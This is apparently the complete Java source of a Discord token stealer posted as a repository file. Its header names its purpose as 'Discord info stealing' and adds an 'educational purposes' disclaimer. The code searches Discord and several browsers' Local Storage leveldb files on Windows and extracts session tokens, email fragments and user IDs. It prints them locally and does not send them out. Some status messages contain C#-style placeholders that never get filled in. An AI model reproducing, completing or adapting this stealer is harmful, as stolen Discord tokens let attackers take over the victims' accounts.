import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

/*
 * Author \ Naitz 
 * Purpose of use \ Discord info stealing
 * 
 * Note: this program is only for educational purposes.
 * The actual author is not responsible for any steal or malicious use.
 * 
 * You can open a issue in github for bugs.
 * 
 * Working, last check: 16.07.2021
 */

public class Stealer {

	public static void main(String[] args) {
		for (String info : steal(SearchType.EMAIL)) {
			System.out.println(info);
		}

	}

	enum SearchType {
		TOKEN, EMAIL, USER_ID;
	}

	public static String readFile(String filePath) {
		String content = "";
		try {
			content = new String(Files.readAllBytes(Paths.get(filePath)));
		} catch (IOException e) {
			e.printStackTrace();
		}
		return content;
	}

	public static String toSteal(SearchType type) {
		if (type == SearchType.TOKEN) {
			return ">oken";
		} else if (type == SearchType.USER_ID) {
			return "user_id_cache";
		} else {
			return "email_cache";
		}
	}

	public static ArrayList<String> steal(SearchType type) {
		long start_time;
		long elapsed_time;

		start_time = System.currentTimeMillis();

		String[] paths = { System.getProperty("user.home") + "/AppData/Roaming/Discord/Local Storage/leveldb/", System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/", System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/", System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb/", System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/", System.getProperty("user.home") + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/", System.getProperty("user.home") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/", };

		ArrayList<String> founds = new ArrayList<String>();
		for (String path : paths) {
			if (new File(path).exists()) {
				for (File file : new File(path).listFiles()) {
					{
						if (file.getAbsolutePath().endsWith(".ldb")) {
							String content = readFile(file.getAbsolutePath());
							if (!content.contains(toSteal(type))) {
								continue;
							}
							String remainingContent = content;
							remainingContent = remainingContent.substring(remainingContent.indexOf(toSteal(type)));

							String found = "";
							if (type == SearchType.EMAIL) {
								found = remainingContent.split("\"")[1].split("@")[0] + "@hidden by discord";
							}
							if (type == SearchType.USER_ID) {
								found = remainingContent.split("\"")[0].split("}")[1].substring(3);
							}
							if (type == SearchType.TOKEN) {
								found = remainingContent.split("\"")[1];
							}
							if (founds.contains(found)) {
								continue;
							}
							founds.add(found);
						}
					}
				}
			}
		}

		int total_tokens_size = founds.size();

		elapsed_time = System.currentTimeMillis() - start_time;

		if (total_tokens_size == 0) {
			founds.add("Nothing found, scanned " + paths.length + " files, elapsed: {elapsed_time} ms (millisecond).");
		} else {
			founds.add("Found " + total_tokens_size + " " + type + ", scanned {paths.Length} discord paths, elapsed: {elapsed_time} ms (millisecond).");
		}
		return founds;
	}
}
